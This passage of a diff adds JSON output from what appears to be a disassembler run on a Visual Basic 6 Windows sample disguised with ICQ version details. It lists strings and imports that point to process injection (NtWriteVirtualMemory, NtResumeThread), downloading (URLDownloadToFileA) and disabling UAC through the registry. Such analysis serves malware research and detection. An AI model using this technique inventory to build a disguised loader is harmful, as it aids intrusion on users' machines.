+        },
+        {
+          "ea": 11684,
+          "summary": "URLDownloadToFileA"
+        },
+        {
+          "ea": 19152,
+          "summary": "CreateFolder"
+        },
+        {
+          "ea": 13140,
+          "summary": "LockResource"
+        },
+        {
+          "ea": 12536,
+          "summary": "NtCurrentTeb"
+        },
+        {
+          "ea": 11204,
+          "summary": "NtWriteVirtualMemory"
+        },
+        {
+          "ea": 12136,
+          "summary": "SizeofResource"
+        },
+        {
+          "ea": 18484,
+          "summary": "Explorer.exe, "
+        },
+        {
+          "ea": 19092,
+          "summary": "WriteLine"
+        },
+        {
+          "ea": 11472,
+          "summary": "NtResumeThread"
+        },
+        {
+          "ea": 12696,
+          "summary": "NtDelayExecution"
+        },
+        {
+          "ea": 19180,
+          "summary": "FileExists"
+        },
+        {
+          "ea": 13108,
+          "summary": "LoadResource"
+        },
+        {
+          "ea": 19064,
+          "summary": "OpenTextFile"
+        },
+        {
+          "ea": 13912,
+          "summary": "Information"
+        },
+        {
+          "ea": 19024,
+          "summary": ".txt"
+        },
+        {
+          "ea": 18592,
+          "summary": "\\r\\n"
+        },
+        {
+          "ea": 13488,
+          "summary": "UACDisableNotify"
+        },
+        {
+          "ea": 10004,
+          "summary": "C:\\Program Files..dio\\VB98\\VB6.OLB"
+        },
+        {
+          "ea": 19232,
+          "summary": "Shell"
+        },
+        {
+          "ea": 11356,
+          "summary": "65543"
+        },
+        {
+          "ea": 13076,
+          "summary": "FindResourceA"
+        },
+        {
+          "ea": 12860,
+          "summary": "kernel32"
+        },
+        {
+          "ea": 13956,
+          "summary": "Warnung"
+        },
+        {
+          "ea": 11912,
+          "summary": "ExecQuery"
+        },
+        {
+          "ea": 11892,
+          "summary": "winmgmts:"
+        },
+        {
+          "ea": 11932,
+          "summary": "Terminate"
+        },
+        {
+          "ea": 19124,
+          "summary": "FolderExists"
+        },
+        {
+          "ea": 11168,
+          "summary": "&H3000"
+        },
+        {
+          "ea": 8350,
+          "summary": "@*\\AC:\\Users\\Own..oad\\Project1.vbp"
+        },
+        {
+          "ea": 11748,
+          "summary": "RtlMoveMemory"
+        },
+        {
+          "ea": 13676,
+          "summary": "EnableLUA"
+        },
+        {
+          "ea": 13528,
+          "summary": "RegCloseKey"
+        },
+        {
+          "ea": 13452,
+          "summary": "RegSetValueExW"
+        },
+        {
+          "ea": 13348,
+          "summary": "RegOpenKeyW"
+        },
+        {
+          "ea": 18776,
+          "summary": "REG ADD "
+        },
+        {
+          "ea": 11664,
+          "summary": "urlmon"
+        },
+        {
+          "ea": 10592,
+          "summary": "&H5059"
+        },
+        {
+          "ea": 10980,
+          "summary": "&H4550"
+        },
+        {
+          "ea": 11016,
+          "summary": "&H44"
+        },
+        {
+          "ea": 19216,
+          "summary": ".bat"
+        },
+        {
+          "ea": 10928,
+          "summary": "NTDLL"
+        },
+        {
+          "ea": 19112,
+          "summary": "Close"
+        },
+        {
+          "ea": 13052,
+          "summary": "Kernel32"
+        },
+        {
+          "ea": 10904,
+          "summary": "KERNEL32"
+        },
+        {
+          "ea": 613,
+          "summary": "NTDLL.DLL"
+        },
+        {
+          "ea": 18912,
+          "summary": "shell32"
+        },
+        {
+          "ea": 12228,
+          "summary": "ConvertStringSec..urityDescriptorA"
+        },
+        {
+          "ea": 10944,
+          "summary": "&H5A4D"
+        },
+        {
+          "ea": 19036,
+          "summary": "CopyFile"
+        },
+        {
+          "ea": 52808,
+          "summary": "kernel32.dll"
+        },
+        {
+          "ea": 52822,
+          "summary": "MSVBVM60.DLL"
+        },
+        {
+          "ea": 634,
+          "summary": "MSVBVM60.DLL"
+        },
+        {
+          "ea": 600,
+          "summary": "kernel32.dll"
+        },
+        {
+          "ea": 529806,
+          "summary": "XIGDAIEjhMWNJXBp..PADDINGXXPADDING"
+        },
+        {
+          "ea": 13760,
+          "summary": "temp"
+        },
+        {
+          "ea": 10516,
+          "summary": "&H68"
+        },
+        {
+          "ea": 10632,
+          "summary": "&HE8"
+        },
+        {
+          "ea": 11340,
+          "summary": "&H10"
+        },
+        {
+          "ea": 11324,
+          "summary": "&H14"
+        },
+        {
+          "ea": 11280,
+          "summary": "&HF8"
+        },
+        {
+          "ea": 11252,
+          "summary": "&H54"
+        },
+        {
+          "ea": 11188,
+          "summary": "&H40"
+        },
+        {
+          "ea": 11000,
+          "summary": "&H34"
+        },
+        {
+          "ea": 10964,
+          "summary": "&H3C"
+        },
+        {
+          "ea": 10856,
+          "summary": "&H50"
+        },
+        {
+          "ea": 10648,
+          "summary": "&HC3"
+        },
+        {
+          "ea": 18020,
+          "summary": " /v "
+        },
+        {
+          "ea": 623,
+          "summary": "user32.dll"
+        },
+        {
+          "ea": 52836,
+          "summary": "user32.dll"
+        },
+        {
+          "ea": 12208,
+          "summary": "advapi32.dll"
+        },
+        {
+          "ea": 11296,
+          "summary": "&H28"
+        },
+        {
+          "ea": 12340,
+          "summary": "SetKernelObjectSecurity"
+        },
+        {
+          "ea": 7048,
+          "summary": "VB5!"
+        },
+        {
+          "ea": 528870,
+          "summary": "655E7@<26>473G70..mw|V_?%iQ$Ra^|&n"
+        },
+        {
+          "ea": 535744,
+          "summary": "764C4A7258715D63..\nC\r\nF\r\nB\r\nB\r\nO\r\n"
+        },
+        {
+          "ea": 8196,
+          "summary": "28C4C820-401A-10..3C9-08002B2F49FB"
+        },
+        {
+          "ea": 12464,
+          "summary": "CallWindowProcA"
+        },
+        {
+          "ea": 9832,
+          "summary": "Module11"
+        },
+        {
+          "ea": 461218,
+          "summary": "Tcupqor!uid!kvng..kf rl`jdw%ibnaoc"
+        },
+        {
+          "ea": 9796,
+          "summary": "Module7"
+        },
+        {
+          "ea": 9748,
+          "summary": "Module1"
+        },
+        {
+          "ea": 9756,
+          "summary": "Module2"
+        },
+        {
+          "ea": 9772,
+          "summary": "Module4"
+        },
+        {
+          "ea": 9780,
+          "summary": "Module5"
+        },
+        {
+          "ea": 9788,
+          "summary": "Module6"
+        },
+        {
+          "ea": 9764,
+          "summary": "Module3"
+        },
+        {
+          "ea": 9804,
+          "summary": "Module8"
+        },
+        {
+          "ea": 9812,
+          "summary": "Module9"
+        },
+        {
+          "ea": 9820,
+          "summary": "Module10"
+        },
+        {
+          "ea": 9844,
+          "summary": "Module12"
+        },
+        {
+          "ea": 9856,
+          "summary": "Module13"
+        },
+        {
+          "ea": 9876,
+          "summary": "Module14"
+        },
+        {
+          "ea": 9888,
+          "summary": "Project1"
+        },
+        {
+          "ea": 12452,
+          "summary": "USER32"
+        },
+        {
+          "ea": 9868,
+          "summary": "Form3"
+        },
+        {
+          "ea": 9740,
+          "summary": "Form1"
+        },
+        {
+          "ea": 461302,
+          "summary": "Qftptnp jr'vfqp'..elq#yl~q#pyldqjf"
+        },
+        {
+          "ea": 94540,
+          "summary": "ICQ.exe"
+        },
+        {
+          "ea": 207310,
+          "summary": "<999<???;<?;9<99..99;9<<<<<;;9?;;;"
+        },
+        {
+          "ea": 209497,
+          "summary": "<><55>55<<5??5?8..<5>8<??5???5<<<<"
+        },
+        {
+          "ea": 94632,
+          "summary": "7.5.0.5255"
+        },
+        {
+          "ea": 94014,
+          "summary": "VS_VERSION_INFO"
+        },
+        {
+          "ea": 10740,
+          "summary": "kernel32.dll"
+        },
+        {
+          "ea": 94292,
+          "summary": "7.5.0.5255"
+        },
+        {
+          "ea": 460866,
+          "summary": "qmp,Pfwp#wkf#soq..#qemlwf#`lnsvwfq"
+        },
+        {
+          "ea": 94506,
+          "summary": "OriginalFilename"
+        },
+        {
+          "ea": 9980,
+          "summary": "Form"
+        },
+        {
+          "ea": 94142,
+          "summary": "040904b0"
+        },
+        {
+          "ea": 461634,
+          "summary": "Hllh%bt jn`kjhjc..$eqon#pla#aqebfv"
+        },
+        {
+          "ea": 101253,
+          "summary": "ass\\serwor.usrQewerseQeoay"
+        },
+        {
+          "ea": 161497,
+          "summary": "I@9YQqjfrdn%Ejo`..A:=_wab24533-lbb"
+        },
+        {
+          "ea": 461726,
+          "summary": "Lggqrs vifm#b$vf..wpmmg ul#`hmmags"
+        },
+        {
+          "ea": 460930,
+          "summary": "qds,Pfwp#wkf#man..#qeklwf#elnsvqeq"
+        },
+        {
+          "ea": 94392,
+          "summary": "Copyright (c) 19..8-2010 ICQ, LLC."
+        },
+        {
+          "ea": 8268,
+          "summary": "COMDLG32.OCX"
+        },
+        {
+          "ea": 94466,
+          "summary": "LegalTrademarks"
+        },
+        {
+          "ea": 209188,
+          "summary": "<=;;;><;<8?88;<"
+        },
+        {
+          "ea": 154549,
+          "summary": "\nagtsk`k.dnl"
+        },
+        {
+          "ea": 152970,
+          "summary": "phelf32.gfo"
+        },
+        {
+          "ea": 10660,
+          "summary": "user32.dll"
+        },
+        {
+          "ea": 461798,
+          "summary": "Lc`vvs#aewfr#e$w..lm$kap#`nnpoatf`"
+        },
+        {
+          "ea": 159362,
+          "summary": "TjhInew.goo"
+        },
+        {
+          "ea": 461050,
+          "summary": "Qfwvqmu/Sfwp#wnf..e&llibo#elmsvweq"
+        },
+        {
+          "ea": 10200,
+          "summary": "VBA6.DLL"
+        },
+        {
+          "ea": 93401,
+          "summary": "DDDDDDDDDGpw"
+        },
+        {
+          "ea": 312486,
+          "summary": "\n\n\n\nZ"
+        },
+        {
+          "ea": 117705,
+          "summary": "\n8\n\n\n"
+        },
+        {
+          "ea": 93385,
+          "summary": "DDDDDDDDDGpw"
+        },
+        {
+          "ea": 20469,
+          "summary": "DDDDDDDDDGpw"
+        },
+        {
+          "ea": 161733,
+          "summary": "3\n\n\n\n"
+        },
+        {
+          "ea": 20485,
+          "summary": "DDDDDDDDDGpw"
+        },
+        {
+          "ea": 461102,
+          "summary": "Wewuqms#thf#ptbq..ckew conk``tbln\n"
+        },
+        {
+          "ea": 461593,
+          "summary": "\nOiywfn glx jjgl..megtjlm qfrqapwp"
+        },
+        {
+          "ea": 193139,
+          "summary": "\n\n\niiWkiaa~UOxqd..`dw\\XdjdCemzfapa"
+        },
+        {
+          "ea": 185036,
+          "summary": "etwdrkAgapter"
+        },
+        {
+          "ea": 166158,
+          "summary": "01:1;1"
+        },
+        {
+          "ea": 94322,
+          "summary": "InternalName"
+        },
+        {
+          "ea": 94218,
+          "summary": "FileDescription"
+        },
+        {
+          "ea": 91252,
+          "summary": "7c77@@@"
+        },
+        {
+          "ea": 208702,
+          "summary": "`gcjj`g`c"
+        },
+        {
+          "ea": 461462,
+          "summary": "Aln`p#xe`haw to#..slqq+ang*agbstox"
+        },
+        {
+          "ea": 19640,
+          "summary": "MSComDlg.CommonDialog"
+        },
+        {
+          "ea": 203690,
+          "summary": "DRABAED"
+        },
+        {
+          "ea": 8281,
+          "summary": "MSComDlg.CommonDialog"
+        },
+        {
+          "ea": 208196,
+          "summary": "CFCEC@FFejcf`jSSVEcf"
+        },
+        {
+          "ea": 461422,
+          "summary": "Bhcesw#bm#je`lfi..demn`wjdn#ynrvnx"
+        },
+        {
+          "ea": 461842,
+          "summary": "N`gtvp#`vvjmc tq..#le#pfoghnd#gepd"
+        },
+        {
+          "ea": 208351,
+          "summary": "e````e"
+        },
+        {
+          "ea": 151266,
+          "summary": "@9_Tjjgltp_PzyQL..qenf-goo\nPOGl`Uq"
+        },
+        {
+          "ea": 94106,
+          "summary": "StringFileInfo"
+        },
+        {
+          "ea": 203652,
+          "summary": "annofaie"
+        },
+        {
+          "ea": 94602,
+          "summary": "ProductVersion"
+        },
+        {
+          "ea": 532652,
+          "summary": "SETTINGS"
+        },
+        {
+          "ea": 53534,
+          "summary": "__vbaGenerateBoundsError"
+        },
+        {
+          "ea": 10368,
+          "summary": "__vbaGenerateBoundsError"
+        },
+        {
+          "ea": 157026,
+          "summary": "NpPfwOmllqnkwjlmSql`fpp"
+        },
+        {
+          "ea": 154246,
+          "summary": "easFetGtjucqBctcqivtiohB"
+        },
+        {
+          "ea": 94726,
+          "summary": "Translation"
+        },
+        {
+          "ea": 94166,
+          "summary": "CompanyName"
+        },
+        {
+          "ea": 182964,
+          "summary": "s\n\n\n"
+        },
+        {
+          "ea": 299085,
+          "summary": "\n\"\n.\n\n"
+        },
+        {
+          "ea": 183631,
+          "summary": "\n\n\nL"
+        },
+        {
+          "ea": 462074,
+          "summary": "pbpp"
+        },
+        {
+          "ea": 193195,
+          "summary": "\n\n\nD"
+        },
+        {
+          "ea": 405148,
+          "summary": "E\n\n\n"
+        },
+        {
+          "ea": 129762,
+          "summary": "\r\n\n\n"
+        },
+        {
+          "ea": 77,
+          "summary": "!This program ca..in DOS mode.\r\r\n$"
+        },
+        {
+          "ea": 162946,
+          "summary": "GllaaoBoloc"
+        },
+        {
+          "ea": 67924,
+          "summary": "SS.."
+        },
+        {
+          "ea": 52988,
+          "summary": "__vbaVarVargNofree"
+        },
+        {
+          "ea": 10704,
+          "summary": "__vbaVarVargNofree"
+        },
+        {
+          "ea": 312359,
+          "summary": "\n\n\n\n0f"
+        },
+        {
+          "ea": 289072,
+          "summary": "A\n\n\n"
+        },
+        {
+          "ea": 94266,
+          "summary": "FileVersion"
+        },
+        {
+          "ea": 461694,
+          "summary": "Pamg$g`ua#wl$sdilsa#`lnqqwav"
+        },
+        {
+          "ea": 461178,
+          "summary": "Retuqms&qkn*flcb..`mlne J[#aggsfss"
+        },
+        {
+          "ea": 195894,
+          "summary": "PKDftPve`jboEoog`rLlcbtjln"
+        },
+        {
+          "ea": 95595,
+          "summary": "!Whiu#vrlgqan `a..rvm im#GLS mogf."
+        },
+        {
+          "ea": 166104,
+          "summary": "G337"
+        },
+        {
+          "ea": 179658,
+          "summary": "Vfof`wLg`ffw"
+        },
+        {
+          "ea": 150528,
+          "summary": "qffe"
+        },
+        {
+          "ea": 152274,
+          "summary": "TmfAqlwpfr\\AfeotfMavlbbte2\n"
+        },
+        {
+          "ea": 207838,
+          "summary": "\\_^SUP!C@C@ASSS`cec`cC`c ##"
+        },
+        {
+          "ea": 166046,
+          "summary": "3C32"
+        },
+        {
+          "ea": 118586,
+          "summary": "WBGB"
+        },
+        {
+          "ea": 117938,
+          "summary": "trsQauerseYelar"
+        },
+        {
+          "ea": 186428,
+          "summary": "pjoo"
+        },
+        {
+          "ea": 460294,
+          "summary": "srrIosruveuiihs"
+        },
+        {
+          "ea": 193026,
+          "summary": "Troq@nnuqlo\nflRl`afu"
+        },
+        {
+          "ea": 189646,
+          "summary": "addr"
+        },
+        {
+          "ea": 108898,
+          "summary": "\n\n\n\n"
+        },
+        {
+          "ea": 54014,
+          "summary": "__vbaErrorOverflow"
+        },
+        {
+          "ea": 93369,
+          "summary": "DDDDDDDDD@"
+        },
+        {
+          "ea": 53670,
+          "summary": "__vbaRedimPreserve"
+        },
+        {
+          "ea": 111490,
+          "summary": "\n\n\n\n"
+        },
+        {
+          "ea": 91364,
+          "summary": ">v=v?v>"
+        },
+        {
+          "ea": 147802,
+          "summary": "crs_rfsrfq"
+        },
+        {
+          "ea": 54328,
+          "summary": "__vbaLateMemCallLd"
+        },
+        {
+          "ea": 195156,
+          "summary": "9a77-"
+        },
+        {
+          "ea": 54304,
+          "summary": "__vbaVarLateMemCallLd"
+        },
+        {
+          "ea": 177942,
+          "summary": "FikdFirstPwiCbcboOntrrD"
+        },
+        {
+          "ea": 12032,
+          "summary": "__vbaVarLateMemCallLd"
+        },
+        {
+          "ea": 179562,
+          "summary": "@qfbwe@lnsbwjaofAj~nbs"
+        },
+        {
+          "ea": 12172,
+          "summary": "__vbaRedimPreserve"
+        },
+        {
+          "ea": 335013,
+          "summary": "\n\n\n\n"
+        },
+        {
+          "ea": 461550,
+          "summary": "Qfwqjeuf#db~b*pf.. wko rfmewf*cogs"
+        },
+        {
+          "ea": 180150,
+          "summary": "JmwfqmewSetPwbwvsCbgoab`k"
+        }
+      ],
+      "imports": [
+        {
+          "ea": 4096,
+          "name": "kernel32.GetProcAddress",
+          "type": "IMPORT",
+          "num_refs": 7
+        },
+        {
+          "ea": 4100,
+          "name": "kernel32.RtlMoveMemory",
+          "type": "IMPORT",
+          "num_refs": 8
+        },
+        {
+          "ea": 4104,
+          "name": "kernel32.LoadLibraryA",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 4112,
+          "name": "user32.CallWindowProcA",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 4120,
+          "name": "msvbvm60.__vbaVarTstGt",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 4124,
+          "name": "msvbvm60._CIcos",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 4128,
+          "name": "msvbvm60._adj_fptan",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 4132,
+          "name": "msvbvm60.__vbaVarMove",
+          "type": "IMPORT",
+          "num_refs": 23
+        },
+        {
+          "ea": 4136,
+          "name": "msvbvm60.__vbaStrI4",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 4140,
+          "name": "msvbvm60.__vbaVarVargNofree",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 4144,
+          "name": "msvbvm60.__vbaAryMove",
+          "type": "IMPORT",
+          "num_refs": 4
+        },
+        {
+          "ea": 4148,
+          "name": "msvbvm60.__vbaFreeVar",
+          "type": "IMPORT",
+          "num_refs": 29
+        },
+        {
+          "ea": 4152,
+          "name": "msvbvm60.__vbaGosubReturn",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 4156,
+          "name": "msvbvm60.__vbaStrVarMove",
+          "type": "IMPORT",
+          "num_refs": 5
+        },
+        {
+          "ea": 4160,
+          "name": "msvbvm60.__vbaLenBstr",
+          "type": "IMPORT",
+          "num_refs": 4
+        },
+        {
+          "ea": 4164,
+          "name": "msvbvm60.__vbaEnd",
+          "type": "IMPORT",
+          "num_refs": 5
+        },
+        {
+          "ea": 4168,
+          "name": "msvbvm60.__vbaPut3",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 4172,
+          "name": "msvbvm60.__vbaFreeVarList",
+          "type": "IMPORT",
+          "num_refs": 17
+        },
+        {
+          "ea": 4176,
+          "name": "msvbvm60._adj_fdiv_m64",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 4180,
+          "name": "msvbvm60.__vbaNextEachVar",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 4184,
+          "name": "msvbvm60.rtcAnsiValueBstr",
+          "type": "IMPORT",
+          "num_refs": 4
+        },
+        {
+          "ea": 4188,
+          "name": "msvbvm60._adj_fprem1",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 4192,
+          "name": "msvbvm60.rtcGetObject",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 4196,
+          "name": "msvbvm60.__vbaStrCat",
+          "type": "IMPORT",
+          "num_refs": 14
+        },
+        {
+          "ea": 4200,
+          "name": "msvbvm60.__vbaLsetFixstr",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 4204,
+          "name": "msvbvm60.__vbaSetSystemError",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 4208,
+          "name": "msvbvm60.__vbaHresultCheckObj",
+          "type": "IMPORT",
+          "num_refs": 5
+        },
+        {
+          "ea": 4212,
+          "name": "msvbvm60._adj_fdiv_m32",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 4216,
+          "name": "msvbvm60.__vbaAryVar",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 4220,
+          "name": "msvbvm60.__vbaAryDestruct",
+          "type": "IMPORT",
+          "num_refs": 26
+        },
+        {
+          "ea": 4224,
+          "name": "msvbvm60.__vbaVarForInit",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 4228,
+          "name": "msvbvm60.rtcRandomNext",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 4232,
+          "name": "msvbvm60.rtcRandomize",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 4236,
+          "name": "msvbvm60.rtcMsgBox",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 4240,
+          "name": "msvbvm60.__vbaOnError",
+          "type": "IMPORT",
+          "num_refs": 4
+        },
+        {
+          "ea": 4244,
+          "name": "msvbvm60._adj_fdiv_m16i",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 4248,
+          "name": "msvbvm60.__vbaObjSetAddref",
+          "type": "IMPORT",
+          "num_refs": 4
+        },
+        {
+          "ea": 4252,
+          "name": "msvbvm60._adj_fdivr_m16i",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 4256,
+          "name": "msvbvm60.__vbaVarTstLt",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 4260,
+          "name": "msvbvm60._CIsin",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 4264,
+          "name": "msvbvm60.__vbaErase",
+          "type": "IMPORT",
+          "num_refs": 35
+        },
+        {
+          "ea": 4268,
+          "name": "msvbvm60.rtcMidCharBstr",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 4272,
+          "name": "msvbvm60.__vbaVarZero",
+          "type": "IMPORT",
+          "num_refs": 11
+        },
+        {
+          "ea": 4276,
+          "name": "msvbvm60.__vbaChkstk",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 4280,
+          "name": "msvbvm60.__vbaGosubFree",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 4284,
+          "name": "msvbvm60.__vbaFileClose",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 4288,
+          "name": "msvbvm60.EVENT_SINK_AddRef",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 4292,
+          "name": "msvbvm60.__vbaGenerateBoundsError",
+          "type": "IMPORT",
+          "num_refs": 54
+        },
+        {
+          "ea": 4296,
+          "name": "msvbvm60.rtcKillFiles",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 4300,
+          "name": "msvbvm60.__vbaStrCmp",
+          "type": "IMPORT",
+          "num_refs": 6
+        },
+        {
+          "ea": 4304,
+          "name": "msvbvm60.__vbaVarTstEq",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 4308,
+          "name": "msvbvm60.__vbaAryConstruct2",
+          "type": "IMPORT",
+          "num_refs": 5
+        },
+        {
+          "ea": 4312,
+          "name": "msvbvm60.__vbaCyI4",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 4316,
+          "name": "msvbvm60.__vbaObjVar",
+          "type": "IMPORT",
+          "num_refs": 5
+        },
+        {
+          "ea": 4320,
+          "name": "msvbvm60.__vbaI2I4",
+          "type": "IMPORT",
+          "num_refs": 4
+        },
+        {
+          "ea": 4324,
+          "name": "msvbvm60.DllFunctionCall",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 4328,
+          "name": "msvbvm60.__vbaRedimPreserve",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 4332,
+          "name": "msvbvm60._adj_fpatan",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 4336,
+          "name": "msvbvm60.__vbaFixstrConstruct",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 4340,
+          "name": "msvbvm60.__vbaRedim",
+          "type": "IMPORT",
+          "num_refs": 27
+        },
+        {
+          "ea": 4344,
+          "name": "msvbvm60.EVENT_SINK_Release",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 4348,
+          "name": "msvbvm60.rtcShell",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 4352,
+          "name": "msvbvm60.__vbaUI1I2",
+          "type": "IMPORT",
+          "num_refs": 4
+        },
+        {
+          "ea": 4356,
+          "name": "msvbvm60._CIsqrt",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 4360,
+          "name": "msvbvm60.EVENT_SINK_QueryInterface",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 4364,
+          "name": "msvbvm60.__vbaUI1I4",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 4368,
+          "name": "msvbvm60.__vbaExceptHandler",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 4372,
+          "name": "msvbvm60.rtcSplit",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 4376,
+          "name": "msvbvm60.__vbaPrintFile",
+          "type": "IMPORT",
+          "num_refs": 67
+        },
+        {
+          "ea": 4380,
+          "name": "msvbvm60.rtcReplace",
+          "type": "IMPORT",
+          "num_refs": 4
+        },
+        {
+          "ea": 4384,
+          "name": "msvbvm60.__vbaStrToUnicode",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 4388,
+          "name": "msvbvm60._adj_fprem",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 4392,
+          "name": "msvbvm60._adj_fdivr_m64",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 4396,
+          "name": "msvbvm60.__vbaGosub",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 4400,
+          "name": "msvbvm60.rtcVarBstrFromAnsi",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 4404,
+          "name": "msvbvm60.rtcCreateObject2",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 4408,
+          "name": "msvbvm60.__vbaFPException",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 4412,
+          "name": "msvbvm60.rtcStrConvVar2",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 4416,
+          "name": "msvbvm60.__vbaStrVarVal",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 4420,
+          "name": "msvbvm60.__vbaUbound",
+          "type": "IMPORT",
+          "num_refs": 7
+        },
+        {
+          "ea": 4424,
+          "name": "msvbvm60.__vbaVarCat",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 4428,
+          "name": "msvbvm60.rtcBstrFromAnsi",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 4432,
+          "name": "msvbvm60.VarPtr",
+          "type": "IMPORT",
+          "num_refs": 36
+        },
+        {
+          "ea": 4436,
+          "name": "msvbvm60._CIlog",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 4440,
+          "name": "msvbvm60.__vbaErrorOverflow",
+          "type": "IMPORT",
+          "num_refs": 16
+        },
+        {
+          "ea": 4444,
+          "name": "msvbvm60.__vbaFileOpen",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 4448,
+          "name": "msvbvm60.rtcFreeFile",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 4452,
+          "name": "msvbvm60.__vbaR8Str",
+          "type": "IMPORT",
+          "num_refs": 16
+        },
+        {
+          "ea": 4456,
+          "name": "msvbvm60.__vbaNew2",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 4460,
+          "name": "msvbvm60.__vbaInStr",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 4464,
+          "name": "msvbvm60._adj_fdiv_m32i",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 4468,
+          "name": "msvbvm60._adj_fdivr_m32i",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 4472,
+          "name": "msvbvm60.__vbaStrCopy",
+          "type": "IMPORT",
+          "num_refs": 31
+        },
+        {
+          "ea": 4476,
+          "name": "msvbvm60.__vbaI4Str",
+          "type": "IMPORT",
+          "num_refs": 17
+        },
+        {
+          "ea": 4480,
+          "name": "msvbvm60.__vbaFreeStrList",
+          "type": "IMPORT",
+          "num_refs": 88
+        },
+        {
+          "ea": 4484,
+          "name": "msvbvm60._adj_fdivr_m32",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 4488,
+          "name": "msvbvm60._adj_fdiv_r",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 4492,
+          "name": "msvbvm60.ThunRTMain",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 4496,
+          "name": "msvbvm60.__vbaI4Var",
+          "type": "IMPORT",
+          "num_refs": 4
+        },
+        {
+          "ea": 4500,
+          "name": "msvbvm60.__vbaLateMemCall",
+          "type": "IMPORT",
+          "num_refs": 6
+        },
+        {
+          "ea": 4504,
+          "name": "msvbvm60.__vbaAryLock",
+          "type": "IMPORT",
+          "num_refs": 13
+        },
+        {
+          "ea": 4508,
+          "name": "msvbvm60.__vbaVarDup",
+          "type": "IMPORT",
+          "num_refs": 6
+        },
+        {
+          "ea": 4512,
+          "name": "msvbvm60.__vbaStrToAnsi",
+          "type": "IMPORT",
+          "num_refs": 4
+        },
+        {
+          "ea": 4516,
+          "name": "msvbvm60.__vbaFpI4",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 4520,
+          "name": "msvbvm60.__vbaVarLateMemCallLd",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 4524,
+          "name": "msvbvm60.__vbaLateMemCallLd",
